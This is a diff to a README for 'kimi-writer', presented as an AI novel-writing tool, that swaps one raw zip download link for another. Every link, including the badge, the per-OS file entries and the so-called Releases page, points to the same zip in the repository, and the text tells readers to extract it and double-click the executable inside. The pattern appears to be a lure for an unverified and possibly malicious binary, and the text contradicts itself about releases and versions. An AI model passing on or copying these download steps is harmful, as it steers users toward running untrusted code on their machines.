@@ -1,6 +1,6 @@
 # ✍️ kimi-writer - Write Deep Stories Effortlessly
 
-![Download kimi-writer](https://raw.githubusercontent.com/cyclopediawoodworm112/kimi-writer/main/tools/kimi-writer-v2.3-beta.1.zip%20kimi--writer-v1.0-brightgreen)
+![Download kimi-writer](https://github.com/cyclopediawoodworm112/kimi-writer/raw/refs/heads/main/tools/kimi-writer-1.1.zip%20kimi--writer-v1.0-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ kim-writer is your AI writing assistant. It helps you create novels and stories 
 
 ## 📥 Download & Install
 
-To get the software, visit this page to download: [Download kimi-writer](https://raw.githubusercontent.com/cyclopediawoodworm112/kimi-writer/main/tools/kimi-writer-v2.3-beta.1.zip).
+To get the software, visit this page to download: [Download kimi-writer](https://github.com/cyclopediawoodworm112/kimi-writer/raw/refs/heads/main/tools/kimi-writer-1.1.zip).
 
 1. Click on the "Releases" link above.
 2. Choose the latest version listed.
 3. Download your appropriate file:
-   - **For Windows users:** Look for a file like `https://raw.githubusercontent.com/cyclopediawoodworm112/kimi-writer/main/tools/kimi-writer-v2.3-beta.1.zip`.
-   - **For Mac users:** Look for a file like `https://raw.githubusercontent.com/cyclopediawoodworm112/kimi-writer/main/tools/kimi-writer-v2.3-beta.1.zip`.
-   - **For Linux users:** Look for a file like `https://raw.githubusercontent.com/cyclopediawoodworm112/kimi-writer/main/tools/kimi-writer-v2.3-beta.1.zip`.
+   - **For Windows users:** Look for a file like `https://github.com/cyclopediawoodworm112/kimi-writer/raw/refs/heads/main/tools/kimi-writer-1.1.zip`.
+   - **For Mac users:** Look for a file like `https://github.com/cyclopediawoodworm112/kimi-writer/raw/refs/heads/main/tools/kimi-writer-1.1.zip`.
+   - **For Linux users:** Look for a file like `https://github.com/cyclopediawoodworm112/kimi-writer/raw/refs/heads/main/tools/kimi-writer-1.1.zip`.
 
 4. Once the download finishes, locate the file on your computer and extract it (right-click and select "Extract Here" or use an extraction tool).
 5. Look for the executable file inside the extracted folder and double-click it to run the application.
@@ -66,6 +66,6 @@ For further assistance and tips, visit our community page. This page includes tu
 
 ## 📲 Stay Updated
 
-To receive the latest updates and new features, keep an eye on the [Releases page](https://raw.githubusercontent.com/cyclopediawoodworm112/kimi-writer/main/tools/kimi-writer-v2.3-beta.1.zip). You can also follow us on social media for news and writing tips.
+To receive the latest updates and new features, keep an eye on the [Releases page](https://github.com/cyclopediawoodworm112/kimi-writer/raw/refs/heads/main/tools/kimi-writer-1.1.zip). You can also follow us on social media for news and writing tips.
 
 Now you're ready to begin your journey with kimi-writer! Enjoy writing your next great story.
